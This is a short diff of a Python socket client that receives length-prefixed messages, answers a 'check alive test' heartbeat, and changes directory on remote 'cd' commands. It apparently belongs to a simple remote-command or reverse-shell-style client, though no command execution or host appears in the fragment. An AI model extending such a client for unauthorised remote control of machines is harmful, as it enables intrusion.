@@ -15,7 +15,6 @@ while True:
     while True:
         msg = s.recv(16)
         if new_msg:
-            #print("new msg len:",msg[:HEADERSIZE])
             msglength = msg[:HEADERSIZE].decode("utf-8")
             print("msg length {}".format(msglength.strip(" ")))
             try:
@@ -24,15 +23,15 @@ while True:
                 continue
             new_msg = False
 
-        #print(f"full message length: {msglen}")
-
         full_msg += msg.decode("utf-8")
-
-        #print(len(full_msg))
-
 
         if len(full_msg)-HEADERSIZE == msglen:
             full_msg = full_msg[HEADERSIZE:]
+            if full_msg == "check alive test":
+                s.send(bytes("he", "utf-8"))
+                full_msg = ""
+                new_msg = True
+                continue
             if "cd" in full_msg:
                 print("testt")
                 os.chdir(full_msg[3:])
